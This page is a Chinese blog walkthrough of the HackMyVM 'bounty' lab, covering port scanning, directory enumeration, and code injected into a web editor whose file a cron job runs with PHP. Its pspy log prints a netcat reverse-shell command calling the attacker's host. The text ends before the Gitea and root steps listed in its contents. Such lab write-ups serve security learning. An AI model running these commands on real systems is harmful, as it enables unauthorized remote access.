<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-bounty | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="难度:Medium kali:192.168.1.105 靶机:192.168.1.107 端口扫描oot@kali2 [~&#x2F;Desktop] ➜   nmap -n -Pn -sS -p- --min-rate&#x3D;&quot;5000&quot; 192.168.1.107">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM-bounty">
<meta property="og:url" content="http://ta0.fun/posts/1cc64d1/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="难度:Medium kali:192.168.1.105 靶机:192.168.1.107 端口扫描oot@kali2 [~&#x2F;Desktop] ➜   nmap -n -Pn -sS -p- --min-rate&#x3D;&quot;5000&quot; 192.168.1.107">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/19/OtRAXD.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/19/OtRZzF.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/19/OtRpZl.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/19/OtRJcg.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/19/OtRt7s.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/19/OtR4LK.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/19/OtRDua.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/19/OtRLzS.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/08/20/OtREPN.png">
<meta property="article:published_time" content="2024-08-19T13:12:20.165Z">
<meta property="article:modified_time" content="2024-08-19T16:41:01.317Z">
<meta property="article:author" content="ta0">
<meta property="article:tag" content="定时任务">
<meta property="article:tag" content="gitea-1.16.6-rce">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/08/19/OtRAXD.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">130</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">17</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">201</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A5%9E%E5%A5%87%E7%9A%84shell"><span class="toc-number">2.</span> <span class="toc-text">神奇的shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitea-rce"><span class="toc-number">3.</span> <span class="toc-text">gitea-rce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83root"><span class="toc-number">4.</span> <span class="toc-text">提权root</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/1cc64d1/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-bounty</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-08-19 21:12:20" itemprop="dateCreated datePublished" datetime="2024-08-19T21:12:20+08:00">2024-08-19</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-08-20 00:41:01" itemprop="dateModified" datetime="2024-08-20T00:41:01+08:00">2024-08-20</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">3.3k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">19m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/HackMyVM/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">HackMyVM</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">定时任务</span></a><a class="tag-item" href="/tags/gitea-1-16-6-rce/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">gitea-1.16.6-rce</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><p><strong>难度:Medium</strong></p>
<p><strong>kali:192.168.1.105</strong></p>
<p><strong>靶机:192.168.1.107</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">oot@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜   nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.1.107                                                                                                                                                     <span class="token punctuation">[</span><span class="token number">23</span>:00:22<span class="token punctuation">]</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-19 <span class="token number">23</span>:00 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.107
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00022s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 08:00:27:56:59:9C <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">1.63</span> seconds
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜   nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token string">"5000"</span> <span class="token number">192.168</span>.1.107                                                                                                                                                     <span class="token punctuation">[</span><span class="token number">23</span>:00:45<span class="token punctuation">]</span>
root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token number">192.168</span>.1.107 -p22,80                                                                                                                                                                        <span class="token punctuation">[</span><span class="token number">23</span>:00:48<span class="token punctuation">]</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-08-19 <span class="token number">23</span>:00 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.1.107
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0013s latency<span class="token punctuation">)</span>.

PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.4p1 Debian <span class="token number">5</span>+deb11u1 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> <span class="token number">75</span>:85:67:56:77:e8:5a:d8:f0:49:c5:5d:73:39:c8:16 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> b5:5d:d8:7e:c9:ad:e6:67:7d:5e:e3:ab:b0:a0:fa:f3 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> dd:11:b9:f8:fd:b6:a5:9f:d8:d6:40:c7:db:81:63:67 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.18</span>.0
<span class="token operator">|</span>_http-server-header: nginx/1.18.0
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">)</span>.
MAC Address: 08:00:27:56:59:9C <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least <span class="token number">1</span> <span class="token function">open</span> and <span class="token number">1</span> closed port
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel</code></pre>
<h2 id="神奇的shell"><a href="#神奇的shell" class="headerlink" title="神奇的shell"></a>神奇的shell</h2><p><img src="https://ooo.0x0.ooo/2024/08/19/OtRAXD.png" alt="OtRAXD.png" loading="lazy"><br>看起来像cgi-bin，先扫一下目录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.1.107 <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                     <span class="token punctuation">[</span><span class="token number">23</span>:04:23<span class="token punctuation">]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.1.107
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              txt,php,bak,zip,html
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">51</span><span class="token punctuation">]</span>
/index.php            <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">470</span><span class="token punctuation">]</span>
/templates.php        <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">5920</span><span class="token punctuation">]</span>
/document             <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">169</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.107/document/<span class="token punctuation">]</span>
/document.html        <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">23</span><span class="token punctuation">]</span>
/Templates            <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">169</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.107/Templates/<span class="token punctuation">]</span>
/Uploads              <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">169</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>--<span class="token operator">></span> http://192.168.1.107/Uploads/<span class="token punctuation">]</span>
/localization.php     <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">3444</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>并不是cgi-bin，看起来是个编辑框<br><img src="https://ooo.0x0.ooo/2024/08/19/OtRZzF.png" alt="OtRZzF.png" loading="lazy"><br>可以在下面框里面写东西，并且能点的按钮只有保存，想写一个反弹shell的马，结果提示<br><img src="https://ooo.0x0.ooo/2024/08/19/OtRpZl.png" alt="OtRpZl.png" loading="lazy"><br>于是抓包看看能不能在请求包里面做点文章<br><img src="https://ooo.0x0.ooo/2024/08/19/OtRJcg.png" alt="OtRJcg.png" loading="lazy"><br>好长的一串，进行url解码之后发现就是原先的html脚本，强制修改并没有什么反应<br><img src="https://ooo.0x0.ooo/2024/08/19/OtRt7s.png" alt="OtRt7s.png" loading="lazy"><br>在探测其他路径的时候发现，之前写的马被成功写到了<code>document.html</code>里面<br><img src="https://ooo.0x0.ooo/2024/08/19/OtR4LK.png" alt="OtR4LK.png" loading="lazy"><br>本来认为这并不能解析php没有乱用，结果看kali的时候发现shell已经弹回来了，我突然想起来主页的<code>/usr/bin/php /var/www/html/document.html </code>了，可能就是执行了这个命令把document.html解析了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@kali2 <span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span> ➜  <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">4567</span>                                                                                                                                                                                            <span class="token punctuation">[</span><span class="token number">23</span>:25:30<span class="token punctuation">]</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.1.105<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.1.107<span class="token punctuation">]</span> <span class="token number">40180</span>
<span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hania<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hania<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hania<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,108<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span></code></pre>
<p>简单升级一下shell后找到user flag</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hania@bounty:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-xr-x <span class="token number">3</span> hania hania <span class="token number">4096</span> oct <span class="token number">20</span>  <span class="token number">2022</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">4</span> root  root  <span class="token number">4096</span> oct <span class="token number">20</span>  <span class="token number">2022</span> <span class="token punctuation">..</span>
lrwxrwxrwx <span class="token number">1</span> hania hania    <span class="token number">9</span> oct <span class="token number">20</span>  <span class="token number">2022</span> .bash_history -<span class="token operator">></span> /dev/null
-rw-r--r-- <span class="token number">1</span> hania hania  <span class="token number">220</span> oct <span class="token number">20</span>  <span class="token number">2022</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> hania hania <span class="token number">3526</span> oct <span class="token number">20</span>  <span class="token number">2022</span> .bashrc
drwxr-xr-x <span class="token number">3</span> hania hania <span class="token number">4096</span> oct <span class="token number">20</span>  <span class="token number">2022</span> .local
-rw-r--r-- <span class="token number">1</span> hania hania  <span class="token number">807</span> oct <span class="token number">20</span>  <span class="token number">2022</span> .profile
-rw-r--r-- <span class="token number">1</span> hania hania   <span class="token number">66</span> oct <span class="token number">20</span>  <span class="token number">2022</span> .selected_editor
-rw------- <span class="token number">1</span> hania hania   <span class="token number">16</span> oct <span class="token number">20</span>  <span class="token number">2022</span> user.txt
-rw------- <span class="token number">1</span> hania hania  <span class="token number">104</span> oct <span class="token number">20</span>  <span class="token number">2022</span> .Xauthority
hania@bounty:~$ <span class="token function">cat</span> user.txt 
.*</code></pre>
<p>传个pspy64发现<code>php /var/www/html/document.html</code>原来是个定时任务，怪不得写入马之后能弹回shell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1000</span> <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1417</span>   <span class="token operator">|</span> <span class="token function">sh</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1000</span> <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1416</span>   <span class="token operator">|</span> <span class="token function">sh</span> <span class="token parameter variable">-c</span> <span class="token function">nc</span> <span class="token parameter variable">-e</span> /bin/sh <span class="token number">192.168</span>.1.105 <span class="token number">4567</span> 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1000</span> <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1415</span>   <span class="token operator">|</span> /usr/bin/php /var/www/html/document.html 
<span class="token number">2024</span>/08/19 <span class="token number">17</span>:43:26 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">1000</span> <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1414</span>   <span class="token operator">|</span> /bin/sh <span class="token parameter variable">-c</span> /usr/bin/php /var/www/html/document.html 
